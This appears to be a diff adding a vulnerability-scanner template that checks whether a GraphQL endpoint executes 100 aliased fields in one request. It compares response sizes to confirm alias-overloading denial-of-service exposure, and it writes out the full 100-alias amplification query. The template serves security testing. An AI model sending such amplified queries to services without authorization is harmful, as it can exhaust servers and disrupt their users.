@@ -1,0 +1,79 @@
+# gap: graphql-alias-overloading-amplification
+id: graphql-alias-overloading-amplification
+
+info:
+  name: GraphQL Alias Overloading - Response Amplification Confirmation
+  author: TyrusRC
+  severity: high
+  description: |
+    Detects GraphQL endpoints that accept and EXECUTE 100 aliased
+    copies of a query field in a single operation — proving no
+    alias-count limit is enforced and the operation runs to
+    completion. This is the canonical alias-overloading DoS
+    primitive: a single GraphQL POST multiplied 100× through
+    aliases produces a 100× expensive backend execution.
+
+    The probe pairs a baseline `{__typename}` (one alias) with
+    a 100-alias `{a0:__typename ... a99:__typename}` query. The
+    matcher fires only when:
+    - baseline returns 200 confirming a GraphQL endpoint exists,
+    - the 100-alias query returns 200 (NOT a depth/complexity error),
+    - the response body contains the alias keys `"a0":` through
+      at least `"a90":` (server walked the aliases), and
+    - the response is at least 30× the baseline body size
+      (proves amplification, not truncation/dedup).
+
+    This differentiates from upstream's
+    `graphql-alias-batching.yaml` which only checks that aliases
+    parse. The amplification differential (length ratio + alias-key
+    walk) confirms the DoS pathway is actually exploitable, not
+    just allowed.
+  reference:
+    - https://escape.tech/blog/graphql-batch-attacks-cause-dos/
+    - https://checkmarx.com/blog/alias-and-directive-overloading-in-graphql/
+    - https://docs.firetail.ai/docs/findings/graphql-alias-overloading/
+  tags: custom,vulnerabilities,graphql,dos,amplification,owasp,cwe-400
+
+http:
+  - raw:
+      # Baseline single-alias query
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"query":"{__typename}"}
+
+      # 100-alias amplification probe
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"query":"{a0:__typename a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename a21:__typename a22:__typename a23:__typename a24:__typename a25:__typename a26:__typename a27:__typename a28:__typename a29:__typename a30:__typename a31:__typename a32:__typename a33:__typename a34:__typename a35:__typename a36:__typename a37:__typename a38:__typename a39:__typename a40:__typename a41:__typename a42:__typename a43:__typename a44:__typename a45:__typename a46:__typename a47:__typename a48:__typename a49:__typename a50:__typename a51:__typename a52:__typename a53:__typename a54:__typename a55:__typename a56:__typename a57:__typename a58:__typename a59:__typename a60:__typename a61:__typename a62:__typename a63:__typename a64:__typename a65:__typename a66:__typename a67:__typename a68:__typename a69:__typename a70:__typename a71:__typename a72:__typename a73:__typename a74:__typename a75:__typename a76:__typename a77:__typename a78:__typename a79:__typename a80:__typename a81:__typename a82:__typename a83:__typename a84:__typename a85:__typename a86:__typename a87:__typename a88:__typename a89:__typename a90:__typename a91:__typename a92:__typename a93:__typename a94:__typename a95:__typename a96:__typename a97:__typename a98:__typename a99:__typename}"}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "__typename") || contains(body_1, "data") || contains(body_1, "errors")'
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'len(body_2) > len(body_1) * 30'
+      - type: regex
+        part: body_2
+        regex:
+          - '"a0"\s*:'
+          - '"a50"\s*:'
+          - '"a90"\s*:'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"baseline_size=" + len(body_1) + " amplified_size=" + len(body_2) + " ratio=" + (len(body_2)/len(body_1))'
